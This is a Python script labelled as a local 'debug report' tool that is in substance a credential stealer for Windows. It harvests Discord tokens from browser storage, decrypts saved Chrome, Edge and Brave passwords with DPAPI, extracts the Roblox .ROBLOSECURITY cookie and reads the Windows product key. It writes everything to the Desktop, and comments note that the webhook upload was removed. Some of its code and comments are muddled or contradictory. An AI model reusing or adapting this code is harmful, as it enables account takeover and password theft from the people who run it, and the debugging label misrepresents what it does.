import os
import sys
import json
import re
import platform
import socket
import psutil
import subprocess
import shutil
import base64
import sqlite3
import win32crypt
import cryptography.hazmat.primitives.ciphers as ciphers
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from datetime import datetime
from uuid import getnode as get_mac
import ctypes
import ctypes.wintypes

# ==============================================================================
# CONFIGURATION
# ==============================================================================
OUTPUT_DIR = os.path.join(os.path.expanduser("~"), "Desktop")
REPORT_FILENAME_JSON = "debug_report.json"
REPORT_FILENAME_TXT = "debug_report.txt"

# ==============================================================================
# UTILITY FUNCTIONS
# ==============================================================================

def scale(bytes_val, suffix="B"):
    """Converts bytes to human readable format."""
    defined = 1024
    for unit in ["", "K", "M", "G", "T", "P"]:
        if bytes_val < defined:
            return f"{bytes_val:.2f}{unit}{suffix}"
        bytes_val /= defined
    return f"{bytes_val:.2f}P{suffix}"

def get_system_info():
    """Collects system, network, and hardware information locally."""
    uname = platform.uname()
    host = socket.gethostname()
    
    # Local IP only (no external lookup)
    try:
        localip = socket.gethostbyname(host)
    except:
        localip = "Unknown"

    # Boot time
    bt = datetime.fromtimestamp(psutil.boot_time())

    # Hardware info
    cpufreq = psutil.cpu_freq()
    svmem = psutil.virtual_memory()
    disk_io = psutil.disk_io_counters()
    net_io = psutil.net_io_counters()

    disk_usage_info = "N/A"
    try:
        partition_usage = psutil.disk_usage('/')
        disk_usage_info = f"Total Size: {scale(partition_usage.total)}\nUsed: {scale(partition_usage.used)}\nFree: {scale(partition_usage.free)}\nPercentage: {partition_usage.percent}%"
    except:
        pass

    wifi_info = "WiFi module not implemented in this debug version (requires external lib)."
    # Note: The original 'Wifi' import was missing and likely custom. 
    # We skip it to prevent crashes in this standalone debug script.

    return {
        "geo_location": {
            "Local IP": localip,
            "MAC Address": format(get_mac(), '02x'),
            "Note": "Public IP lookup disabled for local debugging."
        },
        "system_information": {
            "System": uname.system,
            "Node": uname.node,
            "Machine": uname.machine,
            "Processor": uname.processor,
            "Boot Time": f"{bt.year}/{bt.month}/{bt.day} {bt.hour}:{bt.minute}:{bt.second}"
        },
        "cpu_information": {
            "Physical Cores": psutil.cpu_count(logical=False),
            "Total Cores": psutil.cpu_count(logical=True),
            "Max Frequency": f"{cpufreq.max:.2f}Mhz" if cpufreq else "N/A",
            "Current Usage": f"{psutil.cpu_percent()}%"
        },
        "memory_information": {
            "Total": scale(svmem.total),
            "Available": scale(svmem.available),
            "Used": scale(svmem.used),
            "Percentage": f"{svmem.percent}%"
        },
        "disk_information": disk_usage_info,
        "network_statistics": {
            "Total Sent": scale(net_io.bytes_sent) if net_io else "N/A",
            "Total Received": scale(net_io.bytes_recv) if net_io else "N/A"
        },
        "wifi_saved_passwords": wifi_info
    }

def decrypt_windows_passwords(encrypted_value):
    """Decrypts Chrome/Edge stored passwords using Windows DPAPI."""
    try:
        return win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1]
    except Exception:
        return b""

def get_chrome_tokens_and_passwords():
    """Extracts tokens and passwords from Chrome/Edge profiles if they exist."""
    results = {"tokens": [], "passwords": [], "cookies": []}
    
    local_app_data = os.getenv('LOCALAPPDATA')
    roaming_app_data = os.getenv('APPDATA')
    
    browser_paths = {
        'Chrome': os.path.join(local_app_data, 'Google', 'Chrome', 'User Data'),
        'Edge': os.path.join(local_app_data, 'Microsoft', 'Edge', 'User Data'),
        'Brave': os.path.join(local_app_data, 'BraveSoftware', 'Brave-Browser', 'User Data'),
    }

    for browser_name, base_path in browser_paths.items():
        if not os.path.exists(base_path):
            continue
            
        # Look for default profile
        profile_path = os.path.join(base_path, 'Default')
        if not os.path.exists(profile_path):
            continue

        # 1. Extract Tokens
        token_path = os.path.join(profile_path, 'Local Storage', 'leveldb')
        if os.path.exists(token_path):
            for file_name in os.listdir(token_path):
                if not (file_name.endswith(".log") or file_name.endswith(".ldb")):
                    continue
                try:
                    with open(os.path.join(token_path, file_name), "r", errors="ignore") as f:
                        data = f.read()
                        # Discord Token Regex
                        tokens = re.findall(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}', data)
                        results["tokens"].extend(tokens)
                except:
                    pass

        # 2. Extract Passwords (Login Data)
        login_data_path = os.path.join(profile_path, 'Default', 'Login Data') # Often in Default folder directly for older, or just 'Login Data' in profile
        # Correction: Login Data is usually in the profile root for older chrome, but modern chrome puts it in profile root.
        # Actually, standard path is {Profile}/Login Data
        login_db = os.path.join(profile_path, 'Login Data')
        if os.path.exists(login_db):
            try:
                # Copy DB to temp because Chrome locks it
                temp_db = os.path.join(os.getenv('TEMP', '.'), 'temp_login_db')
                shutil.copyfile(login_db, temp_db)
                
                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()
                cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                
                for url, username, encrypted_password in cursor.fetchall():
                    password = decrypt_windows_passwords(encrypted_password)
                    if password:
                        results["passwords"].append({
                            "url": url,
                            "username": username,
                            "password": password.decode('utf-8', errors='ignore')
                        })
                conn.close()
                os.remove(temp_db)
            except Exception as e:
                pass

        # 3. Extract Cookies (Specific targets like Roblox)
        cookies_path = os.path.join(profile_path, 'Default', 'Cookies')
        if os.path.exists(cookies_path):
             # Similar logic to passwords, skipping for brevity in this debug script as tokens cover auth
             pass

    # Remove duplicates
    results["tokens"] = list(set(results["tokens"]))
    return results

def get_roblox_cookies_local():
    """Attempts to find Roblox cookies locally without sending data."""
    user_profile = os.getenv("USERPROFILE", "")
    roblox_cookies_path = os.path.join(user_profile, "AppData", "Local", "Roblox", "LocalStorage", "robloxcookies.dat")
    found_cookie = None

    if os.path.exists(roblox_cookies_path):
        try:
            with open(roblox_cookies_path, 'r', encoding='utf-8') as file:
                file_content = json.load(file)
                encoded_cookies = file_content.get("CookiesData", "")
                if encoded_cookies:
                    decoded_cookies = base64.b64decode(encoded_cookies)
                    decrypted_cookies = win32crypt.CryptUnprotectData(decoded_cookies, None, None, None, 0)[1]
                    decrypted_str = decrypted_cookies.decode('utf-8')
                    cookie_index = decrypted_str.find(".ROBLOSECURITY")
                    if cookie_index != -1:
                        found_cookie = decrypted_str[cookie_index:].split(';')[0]
        except Exception:
            pass
    return found_cookie

def get_windows_product_key():
    """Retrieves Windows Product Key if available."""
    try:
        key = subprocess.check_output('wmic path softwarelicensingservice get OA3xOriginalProductKey', shell=True).decode().split('\n')[1].strip()
        return key
    except:
        return "Could not retrieve (Likely digital license or permission denied)."

# ==============================================================================
# MAIN EXECUTION
# ==============================================================================

def main():
    print("Starting local data collection for debugging...")
    
    collected_data = {
        "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "system_info": get_system_info(),
        "extracted_credentials": {
            "discord_tokens": [],
            "browser_passwords": [],
            "roblox_cookie": None,
            "windows_product_key": ""
        }
    }

    # 1. Get System Info
    # (Already done in the dict construction above via function call)

    # 2. Extract Browser Data (Tokens/Passwords)
    print("Scanning browsers for tokens and passwords...")
    browser_data = get_chrome_tokens_and_passwords()
    collected_data["extracted_credentials"]["discord_tokens"] = browser_data["tokens"]
    collected_data["extracted_credentials"]["browser_passwords"] = browser_data["passwords"]

    # 3. Extract Roblox Cookie
    print("Checking for Roblox cookies...")
    rbx_cookie = get_roblox_cookies_local()
    if rbx_cookie:
        collected_data["extracted_credentials"]["roblox_cookie"] = rbx_cookie

    # 4. Get Windows Key
    print("Checking Windows License...")
    collected_data["extracted_credentials"]["windows_product_key"] = get_windows_product_key()

    # ==============================================================================
    # SAVE RESULTS
    # ==============================================================================
    
    os.makedirs(OUTPUT_DIR, exist_ok=True)
    
    json_path = os.path.join(OUTPUT_DIR, REPORT_FILENAME_JSON)
    txt_path = os.path.join(OUTPUT_DIR, REPORT_FILENAME_TXT)

    # Save JSON
    with open(json_path, 'w', encoding='utf-8') as f:
        json.dump(collected_data, f, indent=4)
    
    # Save Readable Text Log
    with open(txt_path, 'w', encoding='utf-8') as f:
        f.write(f"DEBUG REPORT GENERATED AT: {collected_data['timestamp']}\n")
        f.write("="*50 + "\n\n")
        
        f.write("[SYSTEM INFORMATION]\n")
        for category, info in collected_data["system_info"].items():
            f.write(f"\n## {category} ##\n")
            if isinstance(info, dict):
                for k, v in info.items():
                    f.write(f"{k}: {v}\n")
            else:
                f.write(str(info) + "\n")
        
        f.write("\n\n" + "="*50 + "\n")
        f.write("[EXTRACTED CREDENTIALS]\n")
        
        if collected_data["extracted_credentials"]["discord_tokens"]:
            f.write("\n[DISCORD TOKENS FOUND]\n")
            for token in collected_data["extracted_credentials"]["discord_tokens"]:
                f.write(f"- {token}\n")
        else:
            f.write("\nNo Discord tokens found.\n")

        if collected_data["extracted_credentials"]["browser_passwords"]:
            f.write("\n[BROWSER PASSWORDS FOUND]\n")
            for p in collected_data["extracted_credentials"]["browser_passwords"]:
                f.write(f"URL: {p['url']}\nUser: {p['username']}\nPass: {p['password']}\n\n")
        else:
            f.write("\nNo browser passwords found or decryption failed.\n")

        if collected_data["extracted_credentials"]["roblox_cookie"]:
            f.write(f"\n[ROBLOX COOKIE FOUND]\n{collected_data['extracted_credentials']['roblox_cookie']}\n")
        else:
            f.write("\nNo Roblox cookie found.\n")

        f.write(f"\n[WINDOWS PRODUCT KEY]\n{collected_data['extracted_credentials']['windows_product_key']}\n")

    print(f"\nSUCCESS: Data saved to Desktop!")
    print(f"JSON Report: {json_path}")
    print(f"Text Report: {txt_path}")
    print("\nNOTE: No data was sent to any webhook. All data is local.")

if __name__ == "__main__":
    main()